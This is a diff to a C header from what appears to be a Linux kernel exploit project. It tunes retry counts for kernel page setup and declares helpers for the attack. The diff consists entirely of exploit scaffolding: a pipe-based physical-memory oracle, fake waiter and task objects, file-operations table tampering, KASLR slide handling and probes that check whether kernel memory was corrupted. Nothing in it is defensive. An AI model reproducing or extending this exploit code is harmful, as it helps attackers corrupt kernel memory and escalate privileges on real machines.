@@ -40,6 +40,9 @@
 #include "kernelsnitch/utils.h"
 
 #define KERNEL_PAGE_SETUP_ATTEMPTS 6
+/* Retry-budget defaults: per-target TARGET_HEADER (via offset.h above) wins
+ * when it defines FOPS_KERNEL_PAGE_SETUP_ATTEMPTS (e.g. FZG1: 10). This
+ * precedence flip from the old unconditional define is intentional. */
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #ifndef SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS
 #define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 2
@@ -49,7 +52,9 @@
 #endif
 #else
 #define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 12
+#ifndef FOPS_KERNEL_PAGE_SETUP_ATTEMPTS
 #define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
+#endif
 #endif
 #ifndef SKB_DATA_DELTA
 #define SKB_DATA_DELTA (-0xe80LL)
@@ -146,7 +151,9 @@
   (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
 
 #define CONSUMER_CORE (CORE + 1)
+#ifndef CONSUMER_MAX_CALLS
 #define CONSUMER_MAX_CALLS 1
+#endif
 #define PSELECT_ROUTE_NFDS 320
 #define PSELECT_CONSUMER_NICE 19
 #define PSELECT_CONSUMER_BURST_CALLS 1
@@ -270,6 +277,8 @@ extern int pipe_stage_attempts;
 extern int cfi_dirty_seen;
 extern int cfi_last_step;
 extern int cfi_last_errno;
+extern int cfg_last_set_ret;
+extern int cfg_last_set_errno;
 extern uint64_t kmalloc_pipe_cache;
 extern uint64_t kmalloc_normal_1k_cache;
 extern uint64_t kmalloc_normal_2k_cache;
@@ -435,7 +444,7 @@ void put_fake_waiter(unsigned char *payload, size_t waiter_off,
 
 
 void init_ctx(struct mm_ctx *ctx, size_t cnt);
-void resize_pipe_slots(int pipefd[2], size_t slots);
+int resize_pipe_slots(int pipefd[2], size_t slots);
 void make_pipe_object(int pipefd[2]);
 void alloc_pipe_object(int pipefd[2]);
 void free_pipe_object(int pipefd[2]);
@@ -470,6 +479,35 @@ int prepare_p0_pipe_oracle(void);
 int expand_p0_pipe_oracle(void);
 int verify_p0_pipe_oracle_gate(void);
 int verify_p0_pipe_data_page(uintptr_t target, uint64_t expected);
+/* Single-pass multi-word probe (pipes are destructive-read: one loop must
+ * check the fops pair AND all bank words so postwrite semantics survive).
+ * Pair 0 is the fops pair; the return value follows the verify_p0_pipe_data_page
+ * rule computed on pair 0 only. Bank pairs are diagnostics. */
+struct p0_probe_pair {
+  uintptr_t target;
+  uint64_t expected;
+  const char *label;
+  int exact;
+  uint64_t observed;
+  long nearest;
+};
+int verify_p0_probe_pairs(struct p0_probe_pair *pairs, size_t n);
+/* Production-touch orchestrator: builds the fops pair + legacy production
+ * geometry words (lock@LOCK_OFF, waiter@W0_OFF, task@FAKE_TASK_OFF, fops
+ * table anchors; expected values from the skb mirror) and runs one combined
+ * probe. Returns the fops-pair verdict (same contract as
+ * verify_p0_pipe_data_page). prod_touched_out: 1 if any production word
+ * differs on a page proven to map it (nonzero-word exact match on the same
+ * 4K page), 0 if all probed nonzero words match, -1 if inconclusive
+ * (production page not found in any pipe, or stash not production slot 0). */
+int probe_fops_and_production_touch(
+    uintptr_t fops_target, uint64_t fops_expected, int *prod_touched_out);
+int slide_bank_mirror_word(uintptr_t va, uint64_t *out);
+/* Last-fired route stash (slide_app.c, parent address space). */
+extern size_t fired_route_slot;
+extern uintptr_t fired_route_parent;
+extern uintptr_t fired_route_target;
+extern uintptr_t fired_route_lock;
 uintptr_t scan_p0_pipe_oracle(void);
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
 uint64_t scan_p0_virtual_base_pointer(void);
